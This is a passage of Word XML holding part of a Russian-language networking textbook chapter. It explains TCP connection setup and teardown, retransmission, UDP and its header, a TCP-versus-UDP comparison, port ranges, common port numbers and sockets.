        <w:t>Зачем это нужно?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Синхронизация Sequence Numbers (чтобы понимать порядок пакетов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Проверка, что сервер жив и готов принимать данные</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Согласование параметров (например, MSS — Maximum Segment Size)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Время установки соединения</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Трёхстороннее рукопожатие занимает </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1.5 × RTT (Round-Trip Time)</w:t>
      </w:r>
      <w:r>
        <w:t>, где RTT — время туда и обратно.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Клиент в Москве, сервер в Калифорнии. RTT = 150 мс.  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Время установки TCP-соединения = 1.5 × 150 = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>225 мс</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">.  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>прежде чем</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> начать передавать данные!</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Завершение соединения (FIN)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Когда данные переданы, TCP </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>закрывает соединение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> с помощью флага </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>FIN</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Шаги</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Клиент → Сервер: FIN**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   "Я закончил, больше данных не будет."</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сервер → Клиент: ACK**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   "Понял, подтверждаю."</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сервер → Клиент: FIN**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   "Я тоже закончил."</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Клиент → Сервер: ACK**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   "Окей, закрываю соединение."</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Готово!</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Соединение закрыто.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Повторная передача (Retransmission)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Если сегмент </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>потерялся</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (не пришёл ACK), TCP </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>отправляет его повторно</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Клиент отправляет сегмент с Sequence Number = 1000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Ждёт ACK = 1001</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Если ACK не пришёл через **timeout** (обычно ~200 мс), сегмент отправляется повторно</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Повторяется несколько раз (обычно до 5-7 попыток)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Если всё равно не удалось → **соединение разрывается**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t>: TCP — это как перфекционист с ОКР. Он будет пиздить пакет снова и снова, пока тот не дойдёт.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.4.4. UDP (User Datagram Protocol): быстро и без гарантий</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>UDP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это протокол </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>транспортного уровня</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, который обеспечивает </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>быструю, но ненадёжную доставку</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> данных.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Основные характеристики UDP:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">✅ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Скорость</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: UDP быстрее TCP (нет установки соединения, нет подтверждений)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">✅ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Простота</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: заголовок всего 8 байт (у TCP — минимум 20)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">❌ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ненадёжность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: UDP не гарантирует доставку (пакет может потеряться)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">❌ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Не упорядоченность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: пакеты могут прийти в другом порядке  </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Когда использовать UDP:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Видео/аудио стриминг**: потеря 1-2% пакетов незаметна, важнее скорость</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Онлайн-игры**: важна низкая задержка (лучше потерять пакет, чем ждать повторной передачи)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**DNS**: запросы короткие, проще отправить повторно, чем возиться с TCP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**VoIP (звонки)**: задержка критична, небольшие потери допустимы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**IoT-датчики**: отправка данных каждую секунду (если один пакет потерялся, придёт следующий)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Структура UDP-датаграммы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Заголовок UDP (8 байт)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Поле | Размер | Описание |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|------|--------|----------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Source Port | 16 бит | Порт отправителя |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Destination Port | 16 бит | Порт получателя |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Length | 16 бит | Длина датаграммы (заголовок + данные) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Checksum | 16 бит | Контрольная сумма (опционально) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Data | Переменная | Полезная нагрузка |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сравнение размеров заголовков</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**TCP**: минимум 20 байт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**UDP**: 8 байт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**IP**: 20 байт (IPv4)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Отправка 100 байт данных:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**TCP**: 20 (TCP) + 20 (IP) + 100 (данные) = **140 байт**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**UDP**: 8 (UDP) + 20 (IP) + 100 (данные) = **128 байт**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Экономия</w:t>
      </w:r>
      <w:r>
        <w:t>: 8.6% меньше служебной информации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>TCP vs UDP: когда что использовать?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Критерий | TCP | UDP |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|----------|-----|-----|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Надёжность | ✅ Гарантирует доставку | ❌ Может потерять пакеты |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Скорость | ❌ Медленнее | ✅ Быстрее |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Установка соединения | ❌ Требует (3-way handshake) | ✅ Не требует |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Упорядоченность | ✅ Пакеты в порядке | ❌ Могут прийти вразнобой |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Контроль потока | ✅ Есть | ❌ Нет |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Размер заголовка | 20+ байт | 8 байт |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Примеры | HTTP, HTTPS, FTP, SSH, SMTP | DNS, VoIP, стриминг, игры |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Золотое правило</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Важна надёжность** (файлы, веб, почта) → **TCP**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Важна скорость** (видео, игры, звонки) → **UDP**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.4.5. Порты и сокеты: как различать приложения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Порт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это 16-битное число (от 0 до 65535), которое указывает, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>какое приложение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> должно получить данные.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Зачем нужны порты?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">IP-адрес указывает на </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>компьютер</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, но на одном компьютере может работать </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>куча приложений</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (браузер, Skype, Steam, торрент-клиент). Порт указывает, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>какому приложению</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> предназначены данные.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Аналогия</w:t>
      </w:r>
      <w:r>
        <w:t>: IP-адрес — это адрес дома, а порт — это номер квартиры.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Диапазоны портов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Диапазон | Название | Описание |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|----------|----------|----------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 0–1023 | Well-Known Ports | Зарезервированы для стандартных сервисов (HTTP, FTP, SSH) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1024–49151 | Registered Ports | Зарегистрированы для приложений (MySQL, PostgreSQL) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 49152–65535 | Dynamic/Ephemeral Ports | Временные порты для клиентов |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Популярные порты (выучи наизусть!)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Протокол | Порт | Транспорт | Описание |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|----------|------|-----------|----------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 80 | TCP | Веб-сервер (незащищённый) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>HTTPS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 443 | TCP | Веб-сервер (с шифрованием TLS/SSL) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>FTP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 21 | TCP | Передача файлов (команды) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>FTP Data</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 20 | TCP | Передача файлов (данные) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SSH</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 22 | TCP | Удалённое управление (безопасное) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Telnet</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 23 | TCP | Удалённое управление (небезопасное, устарело) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SMTP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 25 | TCP | Отправка почты |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>DNS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 53 | UDP/TCP | Разрешение доменных имён |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>DHCP Server</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 67 | UDP | Выдача IP-адресов |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>DHCP Client</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 68 | UDP | Получение IP-адреса |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>TFTP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 69 | UDP | Простая передача файлов |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>POP3</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 110 | TCP | Получение почты (скачивание) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IMAP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 143 | TCP | Получение почты (доступ к серверу) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SNMP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 161 | UDP | Мониторинг сетевых устройств |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>HTTPS (alt)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 8080, 8443 | TCP | Альтернативные порты для веб |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>MySQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 3306 | TCP | База данных |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>PostgreSQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 5432 | TCP | База данных |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>RDP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 3389 | TCP | Удалённый рабочий стол Windows |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Minecraft</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 25565 | TCP | Игровой сервер |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Ты открываешь `https://google.com` в браузере.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Браузер отправляет **TCP-сегмент** на порт **443** (HTTPS)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>IP-пакет идёт на IP-адрес Google (`142.250.186.46`)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Сервер Google слушает порт 443 → принимает соединение</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Браузер отправляет HTTP-запрос: `GET / HTTP/1.1`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Сервер отвечает HTML-страницей</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Сокет (Socket)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сокет</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это комбинация </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IP-адреса + порт</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Формат</w:t>
      </w:r>
      <w:r>
        <w:t>: `IP:порт`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`192.168.1.1:80` — веб-сервер в локальной сети</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`8.8.8.8:53` — DNS-сервер Google</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`142.250.186.46:443` — HTTPS-сервер Google</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Уникальное соединение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> определяется </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>парой сокетов</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Клиент**: `192.168.1.100:54321` (клиент выбирает **случайный** порт из диапазона 49152-65535)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сервер**: `142.250.186.46:443`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Это позволяет одному клиенту иметь </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>несколько одновременных соединений</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> к одному серверу (например, 10 вкладок браузера к Google).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
